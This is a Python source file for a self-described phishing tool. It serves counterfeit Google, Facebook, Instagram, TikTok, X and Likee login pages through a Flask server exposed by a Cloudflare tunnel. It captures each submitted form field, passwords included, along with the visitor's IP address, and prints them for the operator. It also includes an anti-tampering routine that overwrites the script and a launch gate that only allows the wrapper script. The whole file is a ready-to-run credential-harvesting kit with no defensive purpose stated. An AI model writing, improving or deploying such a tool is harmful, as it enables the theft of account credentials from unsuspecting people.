import hashlib
import os
import threading
import time
import sys

# --- Start self-monitor ---
SCRIPT_PATH = __file__
EXPECTED_HASH = "a053b26ed0021b86deac3047d4564905613a54ac56dba95ebb9b512d70ec98a1"

def calculate_hash():
    try:
        with open(SCRIPT_PATH, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()
    except:
        return None

def destroy_script():
    try:
        with open(SCRIPT_PATH, "w") as f:
            f.write("# Script destroyed due to tampering.\n")
        print("[X] Tampering detected. Script destroyed.")
    except:
        pass
    sys.exit(1)

def monitor_integrity():
    while True:
        current_hash = calculate_hash()
        if current_hash != EXPECTED_HASH:
            destroy_script()
        time.sleep(3)

threading.Thread(target=monitor_integrity, daemon=True).start()
# --- End self-monitor ---

import subprocess
import base64
from flask import Flask, request, render_template, redirect
from termcolor import cprint
import getpass

# Execution protection: only allowed via Ansar_Allah.sh
if os.getenv("ANSAR_LAUNCH") != "YES":
    print("[X] Unauthorized execution. Use ./Ansar_Allah.sh.")
    sys.exit(1)

app = Flask(__name__)
selected_template = None

template_names = {
    "google": "Google",
    "facebook": "Facebook",
    "instagram": "Instagram",
    "tiktok": "TikTok",
    "x": "X",
    "likee": "Likee"
}

PASSWORD_FILE = "password.txt"

def load_password_from_file():
    if not os.path.exists(PASSWORD_FILE):
        cprint(f"[X] Password file '{PASSWORD_FILE}' not found!", "red")
        return None
    with open(PASSWORD_FILE, "r") as f:
        encoded = f.read().strip()
    try:
        decoded = base64.b64decode(encoded).decode()
        return decoded
    except Exception as e:
        cprint(f"[X] Error decoding password: {e}", "red")
        return None

def slow_print(text, color="white", delay=0.0667):
    for char in text:
        cprint(char, color, end="", flush=True)
        time.sleep(delay)
    print()

def check_password():
    real_password = load_password_from_file()
    if real_password is None:
        return False
    for _ in range(3):
        entered_pass = getpass.getpass("Enter password: ")
        if entered_pass == real_password:
            cprint("[✔] Access granted.\n", "green")
            return True
        else:
            cprint("[X] Wrong password.\n", "red")
    return False

@app.route("/", methods=["GET", "POST"])
def main_page():
    global selected_template
    if selected_template is None:
        return "No template selected."

    if request.method == "POST":
        ip = request.remote_addr
        data = request.form.to_dict()

        cprint(f"\n[+] New login attempt ({template_names[selected_template]})", "cyan")
        cprint(f"    IP: {ip}", "cyan")
        for k, v in data.items():
            cprint(f"    {k}: {v}", "yellow")

        return redirect("/")

    return render_template(f"{selected_template}.html")

def start_flask():
    app.run(host="0.0.0.0", port=5000)

def start_cloudflared():
    cprint("[*] Starting Cloudflared tunnel...", "green")
    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    for line in process.stdout:
        if "https://" in line and "trycloudflare.com" in line:
            cprint(f"[✔] Public URL: {line.strip()}", "green")
            break

def select_template():
    keys = list(template_names.keys())
    while True:
        slow_print("\nAvailable Templates:\n", "cyan")
        for idx, key in enumerate(keys, 1):
            slow_print(f" {idx}. {template_names[key]}", "magenta")
        choice = input("\nSelect a template number: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(keys):
            return keys[int(choice) - 1]
        else:
            cprint("[X] Invalid choice. Try again.\n", "red")

def show_intro():
    os.system("clear")
    slow_print("===================================", "green")
    slow_print("         PHISHING TOOL", "green")
    slow_print("===================================\n", "green")
    slow_print("[*] Templates: Google, Facebook, Instagram, TikTok, X, Likee", "yellow")
    slow_print("[~] Initializing...", "blue")
    for _ in range(25):
        cprint("█", "white", end="", flush=True)
        time.sleep(0.05)
    print("\n")

def main():
    show_intro()

    global selected_template
    selected_template = select_template()
    slow_print(f"\n[✔] Selected: {template_names[selected_template]}\n", "cyan")

    if not check_password():
        cprint("[X] Too many failed attempts. Exiting...", "red")
        return

    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()

    time.sleep(3)
    start_cloudflared()

    slow_print("\n[✔] Server running. Press Ctrl+C to stop.", "green")
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
